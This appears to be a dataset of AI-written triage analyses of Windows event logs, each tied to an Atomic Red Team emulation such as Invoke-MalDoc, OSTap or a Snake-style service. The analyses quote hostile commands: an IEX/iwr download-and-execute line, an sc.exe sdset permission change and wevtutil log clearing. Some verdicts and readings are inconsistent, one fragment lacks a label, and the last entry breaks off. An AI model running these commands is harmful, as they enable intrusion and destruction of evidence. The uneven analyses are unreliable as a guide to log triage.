SOAPHound - Dump BloodHound Data,"## Analysis:

Upon reviewing the provided Windows event logs, several activities stand out as indicators of potentially malicious behavior:

1. **Clearing Event Logs**:
    - Multiple entries, particularly Event ID 104 in the System log, indicate the clearing of various logs (System, Security, Windows PowerShell) by the user `admin_test`. Clearing logs without proper justification is typically associated with actions to hide malicious activities.

2. **Suspicious PowerShell Execution**:
    - The PowerShell logs show that `powershell.exe` was executed with a script that is linked to `AtomicRedTeam`, specifically running `SOAPHound.exe`. This indicates the use of a security testing tool or a simulation of a known adversary technique (T1059.001 - PowerShell Script Execution). 
    - The command includes hardcoded credentials in the script which is considered unsafe and suggests potential capture or misuse of credentials.

3. **Wevtutil.exe Usage**:
    - The Sysmon logs highlight the execution of `wevtutil.exe` to clear various logs. `Wevtutil.exe` is a built-in tool used to manage event logs, frequently used in post-exploitation activities to cover tracks.
    - The commands issued by `wevtutil.exe` (cl Microsoft-Windows-Sysmon/Operational, cl Application, cl System, cl Security, cl ""Windows PowerShell"") imply an intentional attempt to remove traceability of actions.

4. **Command Execution Context**:
    - The contexts (e.g., Current Directory, User) in which these processes were executed imply higher permissions. The user `admin_test` executed these commands with `High` integrity, suggesting administrative privilege usage.

5. **Use of System Utilities**:
    - Processes such as `whoami.exe` and `hostname.exe` were used. While these utilities are benign when used correctly, their usage, along with log-clearing activities, can indicate reconnaissance or validation steps in the preliminary stages of unauthorized access.

## Assessment:

Based on the indicators observed:
- The deliberate clearing of logs and suspicious execution of PowerShell scripts suggest the presence of post-exploitation activities.
- The context and manner of these actions align with common tactics used in system compromises aimed at data collection, privilege validation, and action obfuscation.

## Resolution:

- **MALICIOUS**: The logs demonstrate clear indicators of malicious behavior involving log tampering and the execution of potentially harmful PowerShell scripts under administrative privileges. This necessitates immediate attention and response.

## Guidance on How to Proceed:

1. **Immediate Containment**:
   - Isolate the affected host (`Server002`) from the network to prevent further unauthorized activity.
   
2. **Detailed Investigation**:
   - Conduct a comprehensive forensic investigation to understand the scope of the compromise, identify any potential persistence mechanisms, and gather evidence for further action.
   
3. **Credential Review**:
   - Review and potentially reset credentials related to `admin_test` and any other accounts that may have been compromised.

4. **Log Review and Monitoring**:
   - Review other systems for similar log manipulation patterns.
   - Increase monitoring for unusual activities and unauthorized log clearing attempts across the network.

5. **Incident Response**:
   - Engage the incident response team to manage and remediate the threat, ensuring future protection against similar tactics.

6. **Security Audit**:
   - Perform a security audit to evaluate and strengthen the existing security posture, focusing on access controls and logging strategies."
Simulate BlackByte Ransomware Print Bombing,"After a detailed analysis of the provided Windows event logs, several indicators suggest suspicious activities that could be malicious. Here is the examination of the logs:

### Suspicious and Anomalous Behavior:
1. **Event Log Clearing**:
    - Multiple event log entries show the clearing of logs (`EventID 104`) from the System and Windows PowerShell channels along with an event log clear in the Security channel (`EventID 1102`). It's unusual for event logs to be cleared in quick succession, especially without prior communication or justification. 
    - The log-clearing events were initiated by the user `admin_test`, which, combined with other suspicious activities, could indicate an attempt to cover tracks.

2. **Command Execution Patterns**:
    - The entry for `wevtutil.exe` being used from `C:\Windows\System32\` to clear logs is a known technique often used in attacks to delete traces (`EventID 1`). The command line used (`wevtutil.exe cl Security`) confirms the clearing of the security log.
    - The PowerShell execution (seen in the Sysmon and PowerShell logs as well) shows unusual command line activity using `cmd.exe` to execute PowerShell, which in turn starts 75 instances of Wordpad to print a file associated with the ""AtomicRedTeam"". This pattern is suspicious and indicative of a possible Atomic Red Team testing scenario or an abuse of their scripts for unauthorized tasks.

3. **Multiple Wordpad Processes**:
    - The multiple instances of `wordpad.exe` triggered by the chain of PowerShell and `cmd.exe` commands suggest either a testing, stress-testing scenario or are part of a known technique to confuse monitoring systems.


### Potential Indicators of Compromise:
- **Privilege Escalation or Testing:**
   - The excessive creation of Wordpad processes and execution of commands likely pointing to a simulated attack or testing of system behavior under potentially suspicious conditions using tools like Atomic Red Team, which is widely known for security testing and adversary emulation.

- **Log Manipulation:**
   - The clearing of logs is typically not carried out during normal operations as it removes the ability to audit actions and is a well-known tactic for threat actors to use during compromise.

### Assessment and Recommendations:
Based on the events outlined above:
- **Resolution: SUSPICIOUS**
  - The activities indicate potentially malicious intent or aggressive testing activities that could simulate such intent, requiring further investigation. While some operations could be legitimate testing by administrators, the log-clearing actions and command-line executions point towards actions typically associated with malicious behavior.

### Guidance on How to Proceed:
- **Immediate Actions**: 
  - Conduct a security review of the system by professionals who can conduct forensic analysis to determine the root cause, including the involvement of relevant personnel.
  - Check for any signs of compromise or misuse of administrative privileges by `admin_test`.
  - Verify the necessity and authorization of the executed commands, especially those related to command execution and log clearing.

- **Monitoring & Response**:
  - Enhance monitoring on key systems, focusing on command-line and log manipulation activities that are not typical for the company's operations.
  - Ensure proper logging practices are in place, particularly securing against unauthorized log manipulation or deletion.

- **Communication**:
  - Communicate with IT and security teams about observed activities to mitigate risks associated and consider isolating systems if needed."
Mirror Blast Emulation,"**Analysis of Windows Logs:**

1. **Event Log Clearing:**
   - **Security Log (EventID 1102) and System Log (EventID 104):** These logs indicate that the Windows Security and System event logs were cleared by the user `SERVER002\admin_test`. Log clearing is a common method employed by attackers to erase traces of their activities. This is a significant indicator of potential malicious activity as it suggests an attempt to cover tracks.

2. **Command Execution:**
   - **Sysmon Log (EventID 1 and 5):** Multiple instances of `wevtutil.exe` executions were observed. This utility is often used legitimately to export or clear logs, but given the context of log clearing and the sequence of commands, such activity is suspicious, especially when paired with the clearing of logs.
   - **PowerShell Execution:**
     - The execution of PowerShell with a command altering registry settings related to Excel macro security (`VBAWarnings`) is seen. This aligns with attempts to lower macro security settings, which is a technique frequently used by attackers to facilitate macro-based attacks.
     - The presence of `AtomicRedTeam` in the command line suggests emulation of adversary techniques, possibly for testing purposes. However, such tests should be clearly documented and authorized to avoid alarms.

3. **Time Manipulation:**
   - **System Log (EventID 1 Security Auditing):** The changes in system time through `svchost.exe` are logged. Such behavior, although not always malicious, can be used to manipulate time-based logs or triggers, which is suspicious when seen alongside other potentially malicious activities.

**Assessment:**
- **Suspicious Activity Detected:** The combination of log clearing, registry manipulation via PowerShell scripts, and system time changes points towards potentially unauthorized actions or simulations using possible attack simulations like `AtomicRedTeam`. Although this could be a security test, without confirmation, it raises red flags and demands further investigation.

**Guidance and Next Steps:**
1. **Confirm Intent and Authorization:**
   - Verify with relevant users or teams (such as cybersecurity or IT operations) if this activity was part of authorized testing or simulation exercises.
   - Check for any scheduled or documented pen-tests or red team operations.

2. **User Activity Monitoring:**
   - Closely monitor the activities of `SERVER002\admin_test` to determine if further suspicious behavior occurs.
   - Audit and review the access logs and permissions for this user account.

3. **Log Analysis and Recovery:**
   - Attempt to retrieve cleared logs from backup solutions if available to uncover any obscured activities.
   - Enhance logging and alerting mechanisms to capture similar activities in the future.

4. **System Time Consistency:**
   - Investigate why the system time was altered and evaluate the impact on other scheduled tasks or security mechanisms.

**Resolution:**
- **SUSPICIOUS**: The logs contain activity that is suspicious and warrants further analysis and verification to rule out or confirm malicious intents."
Encoded VBS code execution,"Based on the analysis of the provided Windows event logs, the following suspicious or potentially malicious activities have been identified:

1. **PowerShell Execution:**
   - The PowerShell logs indicate the execution of a PowerShell script with the following command: 
     ```
     powershell.exe & { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); Invoke-Maldoc -macroFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1059.005\src\T1059.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""}
     ```
   - This command attempts to download and execute a script from a GitHub repository associated with Red Canary, an organization known for security testing. The script 'Invoke-MalDoc.ps1' is part of Atomic Red Team's testing payloads, commonly used in adversary simulations.

2. **Sysmon Logs:**
   - Multiple entries show the execution of the PowerShell command under high integrity level, which can pose a significant risk if misused.
   - The use of `wevtutil.exe` to clear event logs (Application, System, Security) is a common technique used by attackers to hide their tracks (an example of anti-forensic activity).

3. **Security Log:**
   - Event ID 1102 signifies that the security event log has been cleared by the user `admin_test`. This activity is highly suspicious as it's often used by threat actors to eliminate evidence of their activities on compromised systems.

4. **System Log:**
   - Event ID 104 also indicates the clearing of the Windows PowerShell event log, which aligns with attempts to cover or obfuscate malicious activities performed using PowerShell.

**Assessment:**
The logs indicate the execution of a known adversarial simulation script and the use of wevtutil.exe to clear logs, which is highly indicative of malicious activity. These activities are typically associated with penetration testing or a real-world attack involving the execution of unauthorized or harmful scripts followed by attempts to hide the activity.

**Conclusion:**
Resolution: **MALICIOUS**  
The actions recorded in the logs show definitive signs consistent with a simulated attack or actual compromise leveraging adversary strategies. Immediate response actions should be undertaken, including isolating the affected system, performing a thorough forensic investigation to understand the extent of the compromise, and monitoring for any further related activity within the network.

**Guidance and Next Steps:**
- Quarantine the affected host (Server002) to prevent potential lateral movement.
- Further investigate the intent and impact of the PowerShell activity.
- Review network traffic logs for exfiltration attempts or additional suspicious connections.
- Verify if the user `admin_test` executed these commands legitimately or if their account was compromised.
- Implement preventative measures to restrict unauthorized PowerShell script executions and event log manipulations in the future.
- Consider engaging Red Canary or a similar security service provider for deeper threat analysis and simulation context, if this was part of a sanctioned test."
PowerShell Session Creation and Use,"After analyzing the provided Windows event logs, several activities stand out that could potentially indicate malicious activity:

1. **Sysmon Logs:**
   - Multiple instances of the `wevtutil.exe` process being executed to clear logs (security, application, and system).
   - Commands being executed with `conhost.exe` using `wevtutil.exe` as its parent process, which is atypical behavior.

2. **Security Logs:**
   - Event ID 1102 indicates the security log was cleared by the user `admin_test`.
   - The presence of anonymous logons (Event ID 4624 with Logon Type 3) reflects unauthorized access attempts possibly from a network source.
   - Event ID 4672 shows privilege use and assignment, notably involving the `SYSTEM` user, which could signal privilege escalation attempts.

3. **Application Logs:**
   - Nothing particularly suspicious was noted.

4. **PowerShell Logs:**
   - The PowerShell command executed creates a session, tests connectivity, writes to a file, retrieves content, and deletes the file in a single execution. This scripting pattern could be related to reconnaissance or information gathering.

5. **System Logs:**
   - Multiple instances of logs being cleared by `admin_test`, indicating possible log tampering to hide activities.

### Assessment:
The combination of using `wevtutil.exe` to repeatedly clear crucial logs (Sysmon, Security, System) coupled with PowerShell script activity suggests attempts to obfuscate potentially malicious actions. The anonymous logon attempts and privilege escalation further strengthen the possibility of unauthorized access or attempted compromise.

### Resolution:
**MALICIOUS**

### Recommendations:
1. **Immediate Actions:**
   - Disconnect the affected host from the network to prevent further unauthorized access or data exfiltration.
   - Conduct a comprehensive investigation of the user `admin_test` for potential compromise.

2. **Forensic Actions:**
   - Capture volatile data from the system (memory dump, network connections) for further analysis.
   - Retrieve backups of cleared logs if possible and correlate with other logs to verify paths of access and activities.

3. **Preventive Actions:**
   - Implement enhanced logging and monitoring to capture future suspicious activities.
   - Introduce network segmentation to limit the spread of potential threats.
   - Apply security patches and update all software to mitigate known vulnerabilities that could be exploited by similar attack vectors.

These steps should facilitate containment of the threat and ensure further investigation and prevention of similar incidents in the future."
OSTap Payload Download,"After a detailed analysis of the provided Windows event logs, several points of concern potentially indicating malicious or suspicious activities can be identified:

1. **Log Clearing Events**: 
   - The Security log shows Event ID 1102, indicating that the event log was cleared by the user `admin_test`. System and PowerShell logs were also cleared (Event ID 104). Clearing logs can be a potential indicator of malicious activity, especially when conducted without prior notification or if done frequently, as it often indicates an attempt to cover tracks.

2. **Command Execution via CMD and CSCRIPT**:
   - Sysmon events indicate script-based execution using CMD and CSCRIPT with potentially suspicious command lines that could download and execute scripts from a remote source, specifically: `cmd.exe` running a JScript with `cscript //E:Jscript` to access an external resource [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt). This behavior aligns with possible PowerShell or script-based attacks where external scripts are fetched and executed.

3. **Privilege Use Events**:
   - Event ID 4672 indicates that the SYSTEM account privileges with a substantial list were granted. While SYSTEM privileges are common, such elevated privilege events should be correlated with other behaviors to determine if there is lateral movement or sensitive operations being conducted with such privileges.

4. **Task Scheduling Operations**:
   - There are several events where the command `schtasks.exe` is used to delete tasks, create tasks, or modify tasks. This behavior could indicate attempts to create persistence mechanisms or remove system-maintained tasks for malicious intent.

5. **Microsoft Edge Update Activity**:
   - Although MicrosoftEdgeUpdate.exe processes and related tasks are commonly legitimate activity for updating software, unusual activity around these and usage outside of regular update cycles should be monitored, especially when linked with other suspicious behaviors.

**Assessment & Resolution**:
Given these observations, there are multiple indicators of potentially **SUSPICIOUS** activity:
- Frequent log clearing by `admin_test`.
- Command and script execution for downloading external scripts.
- Erratic task scheduler actions.
- SYSTEM-level privilege operations in proximity to suspicious activities.

**Guidance**:
- Conduct an in-depth forensic investigation, focusing on the user account `admin_test` and any associated endpoints.
- Review the historical context of similar activities and correlate them with known normal operating procedures.
- Look for other network traffic or logs that might corroborate or dismiss potential malicious external communication attempts.
- Act promptly in isolating logs and stratifying access for further analysis.

Final resolution: **SUSPICIOUS** - further investigation is warranted to confirm or dispel potential malicious intent."
ATHPowerShellCommandLineParameter -Command parameter variations,"Based on the analysis of the provided Windows event logs, several observations can be made which indicate suspicious activities that warrant further investigation:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing:**
   - **Sysmon Events:** Multiple instances of `wevtutil.exe` (Event Log Command Line Utility) being executed on different channels (System, Application, Security, Windows PowerShell, Microsoft-Windows-Sysmon/Operational) with the `cl` (clear log) command.
   - **Security Log:** An event log was cleared by the user `SERVER002\\admin_test`. The event log IDs (1102 and 104) indicate log clearing activities which can be used to cover tracks after illicit activities.

2. **PowerShell Activity:**
   - **Sysmon & PowerShell Logs:** The execution of `powershell.exe` with an unknown script or command (`Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop`) seems highly unusual and could be used to execute commands without leaving clear textual footprints.
   - PowerShell’s ExecutionPolicy may have been set to allow scripts which could hint towards an attempt to run non-standard or untrusted scripts.

3. **High Privilege Process Executions:**
   - The execution of processes such as `wevtutil.exe` and `powershell.exe` with a `High` integrity level under the admin user `SERVER002\\admin_test` could indicate potential exploitations or misuse of elevated privileges.

4. **Console Host (conhost.exe) Activity:**
   - Notably excessive spawning of `conhost.exe` processes usually can indicate command-line operations which may relate to PowerShell scripts or console-based interactions.

5. **Unusual Timing Patterns:**
   - These logs show multiple processes executed almost simultaneously or within a very small time frame, which may suggest automated scripting or batch processing activities intended to either audit, change or manipulate the system state.

### Threats and Risks Identified:

- The log clearing activities are a classic hallmark of an attempt to obscure actions and are a significant indicator of potential malicious activity.
- The use of PowerShell with complex command lines without clear documentation or necessity often associates with advanced and potentially dangerous activities, such as lateral movements or privilege escalations.
- Elevation of privileges events and the running of processes as the SYSTEM account might reflect attempts to exploit or further access sensitive areas or information.

### Guidance on How to Proceed:

- **Immediate Review:** Conduct a deeper forensic investigation on the `admin_test` user account, system policies, connected network activities, and any recent changes applied to the server.
- **Isolation of System:** Consider isolating Server002 to prevent any potential network propagation of malicious actions or scripts if still ongoing.
- **Log Analysis:** Use log retention and retrieval strategies from backups or centralized logging to understand activities before logs were cleared.
- **Security Enhancements:** Apply or double-check execution policies and user account controls to limit unauthorized PowerShell or advanced utility deployments.

### Resolution:

Given the evidence of attempted log clearing and unusual command use in PowerShell, the logs contain clear signs of potentially malicious activity but are not explicitly confirmed to start compromising the system yet. Therefore, the resolution for this analysis is:

**SUSPICIOUS**

These findings indicate suspicious behavior that requires additional investigation to rule out or confirm any system compromise or security threats."
AutoIt Script Execution,"After a thorough analysis of the provided Windows event logs, several indicators of suspicious activity have been identified. Here's a detailed assessment:

### Suspicious Activity:
1. **Clearing Event Logs**:
   - The system log shows multiple instances of Event ID 104, indicating that logs were cleared for the System and Windows PowerShell channels by the user `admin_test`. Additionally, Security log clearing was detected with Event ID 1102.
   - Clearing of logs is a common tactic used by attackers to cover their tracks post-compromise.

2. **System Commands and Tools**:
   - Multiple instances where the utility `wevtutil.exe` was executed (Event ID 1 in Sysmon logs). This tool is used for managing event logs and could be used to clear logs as indicated.

3. **Execution of PowerShell Scripts**:
   - In the Windows PowerShell log, a script execution is observed where a PowerShell script is used to start a process via `AutoIt3.exe` with an argument leading to a temporary script `calc.au3`. The presence of `AtomicRedTeam` in the file path is indicative of a known technique/test used for simulating attack activities, assuming this was not an intentional simulation.

4. **High Privilege Execution**:
   - Event ID 4672 in the Security log indicates special privileges are being used by the `SYSTEM` user, which might be legitimate under certain circumstances but could also be used in an attacker’s escalation to gain greater control over the system.

5. **Suspicious Process Initiation**:
   - `CompatTelRunner.exe`, `AutoIt3.exe`, and the process creation through Windows PowerShell are noted. `AutoIt3` scripting language is often used for automation and can be employed by threat actors to execute payloads.

### Conclusion:
Based on the evidence of log clearing by a non-standard process, the execution of potential malicious scripts, and the usage of automated scripts through PowerShell with known testing frameworks, the activity detailed in these logs represents concerning behavior.

### Resolution: **MALICIOUS**

### Recommendations:
- **Immediate Actions**:
  1. Isolate the affected host to prevent further spread or outgoing malicious activities.
  2. Conduct a memory and disk analysis for `Server002` to scrutinize any malicious payloads or remnants.
  3. Review user behavior for `admin_test` and verify whether this was an authorized penetration test or unintended malicious activity.
  4. Investigate any network connections established by `Server002` around the incident timeframe.

- **Preventative Measures**:
  1. Harden logging and monitoring for critical event channels, preventing unauthorized log clearing.
  2. Implement access reviews and ensure privileged accounts like `admin_test` are controlled with adequate logging and rigorous change management.
  3. Enhance detection rules for PowerShell and utility usage like `wevtutil.exe`.

- **Post-Incident**:
  1. Ensure all identified signs of compromise are addressed and validate the integrity of all systems.
  2. Enhance the security awareness of staff with regular training on detecting and reporting suspicious behaviors.

This analysis outlines the findings and suggests a comprehensive approach to mitigate the current threats and prevent future occurrences."
Snake Malware Service Create,"Upon reviewing the provided logs, several suspicious activities suggest potential malicious behavior. Here's a breakdown:

1. **Event Log Clearing**:
   - The `Security` log shows an event with EventID 1102, which indicates that the event log was cleared. This is suspicious as clearing logs is often done to cover tracks after performing unauthorized or malicious actions.
   - Similar events for the `System` and `Windows PowerShell` logs are noted, suggesting an attempt to cover tracks across multiple log channels.

2. **Usage of `wevtutil`**:
   - The `wevtutil.exe` utility is used multiple times to clear the logs (`wevtutil.exe cl <LogName>` command), which is clear evidence of log tampering and is typically associated with malicious activity or someone attempting to hide their actions.

3. **Suspicious Service Creation**:
   - A `cmd.exe` process was executed with a command creating a service named ""WerFaultSvc"" using `sc.exe`. The details of the service creation, including an unusual `binPath`, suggest potential Trojan installation or persistence mechanism through a bogus service.

4. **Usage of Built-in Tools**:
   - Tools like `whoami.exe` and `hostname.exe` were executed. While not necessarily malicious, their usage in this context and in this sequence could indicate reconnaissance activity, especially due to the correlation with the log clearing.

5. **Privileged Execution Context**:
   - The process executions are conducted with high integrity levels, and the user involved is `admin_test`, suggesting privileged actions.

These activities suggest an attempt to perform potentially unauthorized actions on the host, including creating a potentially malicious service and an attempt to hide these activities by clearing various event logs.

## Assessment:
- **Resolution**: MALICIOUS

The combination of log clearing, suspicious process creation, and usage of administrative tools all point towards malicious intent. The actions are typical of a post-exploitation behavior pattern where an attacker gains access to a machine, performs reconnaissance, seeks persistence, and clears logs to hide evidence of their actions.

## Guidance:
- Conduct a full forensic investigation on `Server002` to identify any additional traces of unauthorized activity.
- Isolate the impacted host to prevent further potential spread of the compromise.
- Review and potentially revoke the credentials associated with `admin_test`.
- Check other systems for similar activity as the attacker might have gained broader network access.
- Consider enhancing monitoring with alerting for log clearing events and suspicious service creation.
- Apply necessary security patches and review security configurations to prevent future intrusions."
Extract Memory via VBA,"Upon a detailed review of the event logs provided, a few indicators suggest potential malicious activity that necessitates further investigation. Here's a breakdown of notable activities:

1. **PowerShell Execution with Malicious Intent**:
   - There is evidence in the logs of a PowerShell invocation using a script from a URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`), which is part of the Atomic Red Team library often used for simulating adversary tactics.
   - Command-line execution (`powershell.exe` with `Invoke-Maldoc`) is a common method for executing malicious payloads. This indicates a high likelihood of a simulated or real attack focused on script-based malware.

2. **Clearing of Event Logs**:
   - The log records show that both the System and Windows PowerShell logs were cleared (`EventID: 104` for System and `1102` for Security), which is a common tactic to cover tracks after executing malicious actions.

3. **Suspicious Use of System Utilities**:
   - A `wevtutil.exe` command was executed to clear logs (`CommandLine"":""C:\\Windows\\system32\\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""`) and this is typically done by threat actors to erase evidence of their actions.

4. **Unusual Process Execution**:
   - The execution of Microsoft Edge Update related processes in unusual contexts might suggest abuse or masquerading. While these binaries typically are benign, their context and relation to the PowerShell activity could necessitate investigation.

5. **Repeated Critical Logon Events**:
   - Multiple `EventID: 4624` indicating logon sessions and `EventID: 4672` indicating special privileges each time are red flags for unauthorized access, particularly when associated with SYSTEM accounts.

Given these findings, the activity captured in the logs does indeed seem suspicious and warrants further investigation to eliminate the possibility of a real breach. There is especially a need to confirm whether the observed activities align with legitimate testing operations such as penetration tests or red team exercises. 

### Resolution: SUSPICIOUS
- **Next Steps**:
  1. Verify with IT or security operations to determine if the simulated threat activity aligns with authorized penetration tests or exercises.
  2. Isolate the affected system and perform a comprehensive scan using updated antivirus and endpoint detection tools.
  3. Review firewall and network traffic logs for any external communication corresponding to the identified suspicious activity.
  4. Notify stakeholders and potentially prepare for incident response actions based on additional findings."

#### System Log:
- **Event ID 104 (LogFileCleared):**
  - The logs show that an account with the username `admin_test` cleared the System log and PowerShell log.
  - An event clearing logs (particularly system and security logs) without a preceding legitimate reason is suspicious. This could be an attempt to hide malicious activity after performing unauthorized actions.

#### PowerShell Log:
- **Event ID 600 (Provider Started):**
  - The PowerShell logs denote the execution of a PowerShell script that fetches and executes a remote script from `https://raw.githubusercontent.com` under the context of ""Invoke-MalDoc"".
  - This URL is associated with potentially malicious scripts, simulating or conducting actions like executing macros (as seen with `Invoke-MalDoc`).
  - Using `iwr` (Invoke-WebRequest) and `IEX` (Invoke-Expression) is a common tactic in PowerShell to download and execute malicious scripts.

#### Security Log:
- **Event ID 1102 (LogFileCleared):**
  - This corroborates the System Log's Event ID 104 that the security logs were cleared around the same time.
  - Clearing security logs is a significant indication of an attempt to cover tracks and should be considered highly suspicious.

#### Sysmon Log:
- **Multiple Events (Process Creation & File Deletion):**
  - Processes like `wevtutil.exe` have been used to delete logs from several channels, including System, PowerShell, and Security logs. This aligns with efforts to erase tracks.
  - Multiple executions of PowerShell indicate unusual activities tied to `Invoke-MalDoc`, corroborating the evidence from PowerShell logs.

### Assessment:
There are multiple red flags pertaining to the activities recorded in these logs:
1. **Log Clearing:** The deliberate clearing of system, security, and PowerShell logs suggests a malicious attempt to obscure activities on the host.
2. **Suspicious PowerShell Activity:** The execution of potentially malicious PowerShell scripts involving remote content from a non-standard URL is a critical indicator of malicious actions.

OSTAP JS version,"Upon reviewing the provided Windows event logs, here are analytical points and findings:

### Suspicious Activity:
1. **PowerShell Execution**: The logs reveal the execution of PowerShell commands that include the download and execution of a script from a GitHub URL:  
   ```plaintext
   IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
   ```
   This is typically indicative of an attempt to download and execute scripts directly from the internet, which can be highly suspicious, particularly if it aligns with known malicious activities or penetration testing scripts.

2. **Clearing of Windows Logs**: Multiple events indicate that logs (System, Security, and Windows PowerShell) were cleared (Event ID 104 in System log and Event ID 1102 in Security log). Clearing logs is often an indication of malicious intent to cover tracks.

3. **Command Execution with High Integrity Levels**: 
   - **Process Execution** of `PowerShell.exe` with high integrity level with download and execution of scripts directly from the internet is a common method used in fileless malware attacks or malicious script execution.
   - Execution of `wevtutil.exe` command to clear certain logs like `Security`, `System`, and `Windows PowerShell`, which is typical behavior following unauthorized actions, with a focus on remaining undetected.

4. **Unusual Process Chain**: The chain of processes involving PowerShell, `cmd.exe`, `wscript.exe`, and scripts suggest potential execution of malicious code potentially using scripting engines, which can be used for attacks such as exploiting vulnerabilities or executing unauthorized tasks.

### Assessment:
- The behavior recorded in these logs strongly suggests activities that align with indicators of compromise. The use of PowerShell to download and execute scripts directly from the internet, combined with the clearing of several logs, is a typical red flag in security monitoring and incident response.
- The activity's pattern fits known techniques for executing malicious payloads and evasion tactics to hinder detection efforts by removing forensic evidence.

### Threat and Risk:
- The presence of a PowerShell script execution from an external source, clearing of logs, and maintaining high integrity levels during execution denote a high risk of compromise.
- These activities may lead to data breaches, unauthorized access, and potential dissemination of malicious software within the network.

### Resolution:
- MALICIOUS – The logs contain activity that is strongly indicative of both compromise and malicious intent. Immediate investigation and response are warranted.

### Guidance:
1. **Immediate Incident Response**: Contain and mitigate the threat by isolating affected systems and performing a thorough forensic examination to understand the extent of the breach.
2. **Investigate the Source and Vector**: Determine how the malicious scripting was initiated and check for any other points of compromise or persistence mechanisms that might exist.
3. **Review Access Controls and Permissions**: Examine user roles and permissions, especially elevated privileges that could have been exploited.
4. **Monitor and Harden Systems**: Implement additional monitoring on PowerShell and logging services, and apply stricter restrictions on remote and script-based executions.
5. **Update Security Policies**: Enhance existing security policies to include preventive measures against similar intrusions, such as up-to-date endpoint protection systems and network-level defenses."
Excel 4 Macro,"Upon analysis of the provided Windows event logs, several events indicate potential signs of malicious activity:

1. **Log File Clearing**:
   - **EventID 104** from the System log shows the clearing of the System and Windows PowerShell logs by the user ""admin_test"" at ""2024-11-02 11:13:56"". Log clearance is often a tactic used by malicious actors to cover their tracks after executing unauthorized or malicious activities.

2. **Suspicious PowerShell Activity**:
   - Multiple execution of PowerShell scripts are documented in both the Sysmon and Windows PowerShell logs, with command lines that involve suspicious activities like downloading and executing files (e.g., sysinternals' ""procexp.exe"") directly from the internet using PowerShell. The script involves creating an Excel application, manipulating cells, and creating VBScript files intended to be executed, indicated by the script content seen in EventID 600 of the PowerShell log.
   - The command being run is characteristic of the **""Invoke-AtomicRedTeam""** technique, which is often used to simulate attack scenarios for testing (red teaming) but could also be used maliciously.

3. **Multiple `wevtutil` Executions**:
   - Several `wevtutil cl` (clear log) commands were executed by the user ""admin_test"". These commands are responsible for clearing logs, as observed in the Sysmon Log (EventID 1) where the commandline shows usage of `wevtutil.exe` for clearing event logs across different channels (e.g., System, Security, and Windows PowerShell).

4. **High Integrity Level Execution**:
   - The actions described were executed with a high integrity level, which means they had the necessary privileges to perform potentially critical operations on the system.

Given these observations, the activities logged are consistent with techniques used in attacks or penetration tests where logs are cleared after performing potentially harmful actions. The combination of these activities suggests a high likelihood of compromise or unauthorized testing activity without proper security controls in place.

### Resolution:
- **MALICIOUS**

### Guidance:
- Immediate investigation is required to determine the legitimacy of these activities. If authorized testing by an internal team, it must be documented and confirmed.
- Check for any unauthorized network connections or data exfiltration activities.
- Ensure user ""admin_test"" and the associated systems are reviewed for any abnormalities.
- If believed to be unauthorized, the incident response team should be engaged to handle the containment and eradication of any potential threats.
- Enhance logging, monitoring, and alerting to detect future similar occurrences promptly."
Modifying ACL of Service Control Manager via SDET,"Upon reviewing the provided Windows event logs, I have identified several points of interest that indicate potential suspicious behavior:

1. **Log Clearing Events:**
   - In the security log, event with ID 1102 indicates that the security log was cleared by the user ""admin_test"". Similarly, events in the system log with ID 104 show that the system and Windows PowerShell logs were cleared by the same user during the same timeframe. This behavior is suspicious as attackers often clear event logs to cover their tracks after malicious activities.

2. **Suspicious Command Execution:**
   - An event in the Sysmon log (Event ID 1) indicates the execution of `cmd.exe` with a command line argument `sc.exe sdset scmanager D:(A;;KA;;;WD)`. This changes the permissions of the service control manager, which may allow any user (including a potential attacker) with network access to control services on the system. This could be indicative of privilege escalation or providing backdoor access.

3. **Use of System Utility with Elevated Permissions:**
   - Multiple instances of `wevtutil.exe` are observed, used to clear various logs such as Application, Security, and System logs, with high integrity level. This indicates elevated permissions were used, likely for the purpose of clearing logs, aligning with potentially malicious concealment practices.

4. **Process Activity:**
   - Numerous executions of `MicrosoftEdgeUpdate.exe` processes are noted, often involving registration and update commands. While Microsoft Edge processes can be typical in a system, the timing alongside log clearances could be considered suspicious, indicating an attempt to potentially execute or update software without appropriate logs being kept.

### Assessment:
The combination of log clearance events, suspicious command execution, and the use of systems utilities with elevated permissions suggests that there is potential unauthorized or malicious activity taking place on this system. Though some activities such as interactions with `MicrosoftEdgeUpdate.exe` may be part of routine updates, the context and combination with other evidenced actions lend these logs towards being suspicious rather than benign.

### Resolution: **SUSPICIOUS**

### Guidance on How to Proceed:
- Conduct a thorough investigation to confirm whether these actions were authorized by a legitimate administrative task or activity.
- Review user account and permission management, specifically focusing on the `admin_test` account.
- Undertake a forensic examination of the system to identify any other indicators of compromise.
- Monitor network traffic and further administrative actions on the system closely to detect any further unauthorized attempts.
- Ensure security policies and log monitoring practices are in place to detect and prevent future unwanted activities."
Headless Chrome code execution via VBA,"After a thorough review of the provided logs, several indicators suggest potential malicious activity on the Windows host, Server002. Here's a detailed analysis:

1. **Event Log Clearing**:
   - The Security log contains an event with ID ""1102"", indicating the security log was cleared by the user `admin_test`. This is a significant red flag, as malicious actors often clear logs to hide their tracks.
   - The System log shows multiple events clearing specific logs (Event ID ""104"") for System and Windows PowerShell channels under the same user account, `admin_test`.

2. **Suspicious PowerShell Activity**:
   - The Windows PowerShell log entries show a suspicious command execution. PowerShell is executing a command to download and execute a script from a GitHub repository. The script uses `Invoke-Maldoc`, which suggests the possible execution of malicious Office macros.
   - The script path and its intent to invoke macros, `Invoke-Maldoc`, are highly suspicious and potentially indicate an attack vector leveraging malicious documents.

3. **Sysmon Events**:
